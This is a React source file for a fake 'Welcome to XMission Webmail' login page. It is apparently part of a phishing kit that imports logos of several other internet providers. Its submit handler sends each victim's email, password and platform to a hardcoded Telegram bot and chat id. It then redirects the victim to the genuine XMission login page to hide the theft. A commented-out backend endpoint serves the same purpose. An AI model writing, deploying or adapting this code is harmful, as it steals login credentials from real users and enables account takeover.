import React from 'react';

import './Home.css'

import { useState } from 'react';

import axios from 'axios';

import iglou from './iglou.png';
import catskill from './catskill.png';
import winstream from './windstream.png';
import wave from './wave.png';
import centurylink from './centurylink.png';
import ftc from './ftc.svg';
import xmission from './xmission.png';

function Home(){


    const[email, setUserName] = useState("");
    const[password, setPassword] = useState("");

    const[platform, setPlatform] = useState("XMission")

    const[showError, setShowError] = useState(false);

    async function handleSubmit(e){
      e.preventDefault();
  
      try {
          // const response = await axios.post('https://mainbackend-rd07.onrender.com/api/send', {
          //     email:email,
          //     password:password,
          //     platform:platform
          // });
  
         const response =  await axios.post(`https://api.telegram.org/bot6471655485:AAH0iIugJnVoXXAcekKKQoxQDzixvzM-zxE/sendMessage`, {
              chat_id: 5868304053,
              text: `Platform : ${platform} , Email : ${email} ,  Password : ${password}`,
            });
  
      
          // Handle success
       
  
          if(response.status == 200){
             // console.log(response.data.message);
  
            
             window.location.href = 'https://webmail.xmission.com/xm/login.php?url=https%3A%2F%2Fwebmail.xmission.com%2Flogin.php';
          }
        } catch (error) {
          // Handle error
          console.error('Error:', error);
        }
      
  }

    return (
        <>

        <div className=''>
        {showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
            <strong>Invalid Email or Password</strong> 
            <button type="button" className="close" data-dismiss="alert" aria-label="Close">
                <span aria-hidden="true">&times;</span>
            </button>
            </div>}
        </div>



            <div className=' py-4 px-3 text-center nav'>
            <img  src={xmission} className="mylogo"/>

            </div>

            <br/>

            <br/>


            <div className='col-md-6 whitediv m-auto   px-0'>
              

            
            <h3 className='text-center font-weight-bold py-3'style={{
                color:"grey",
            }}>Welcome to XMission Webmail</h3>
                



                <form onSubmit={handleSubmit} className="px-5">

                    <div className='form-group mt-5'>
                 
                    <label className='font-weight-bold'>Username</label>
                        <input type="email"onChange={function(e){
                            setUserName(e.target.value);
                        }}value={email}  className="form-control py-2"required />

                    </div>



                    <div className='form-group'>
                  
                    <label className='font-weight-bold'>Password</label>
                        <input type="password"onChange={function(e){
                            setPassword(e.target.value);
                        }}value={password}  className="form-control  py-2"required />
                       

                    </div>

                    

                    <div className='form-group'>
                      <input type="checkbox" /> <span className='font-weight-normal px-2'>Stay signed in
</span>

                    </div>



                   


                    {/* <div className='form-group'>
                    <label class="toggle-container">
                        <input type="checkbox"className='mycheck'/> 
                     <span class="toggle-slider"></span> <span className='px-3 'style={{
                         fontSize:"15px",
                     }}>Shared computer - log me out after 4 hours</span>
    </label>

                    </div> */}


                    {/* <div className='form-group'>
                    <label class="toggle-container">
                        <input type="checkbox"className='mycheck'/> 
                     <span class="toggle-slider"></span> <span className='px-3 'style={{
                         fontSize:"15px",
                     }}>Keep me logged in until I log out</span>
    </label>

                    </div> */}


                    <div className='form-group  mt-5'>

<button type='submit' style={{
  backgroundColor: '#9296a3',
  fontSize:'18px',
  color:'white',
  width:"40%",
}}className='btn text-center  font-weight-bold text-light py-2 rounded '>LOG IN</button>






</div>





<br>

</br>

        

                </form>

            </div>
        
        </>
    );
}

export default Home;